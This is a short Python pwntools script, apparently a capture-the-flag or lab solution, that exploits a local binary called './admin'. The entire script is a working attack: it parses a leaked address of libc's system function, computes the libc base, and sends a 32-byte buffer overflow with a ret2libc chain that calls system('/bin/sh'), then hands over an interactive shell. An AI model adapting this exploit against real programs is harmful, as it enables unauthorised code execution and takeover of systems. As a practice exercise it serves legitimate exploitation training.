from pwn import *

elf = context.binary = ELF('./admin')
libc = elf.libc
p = process()

p.recvuntil(b'at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    b'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()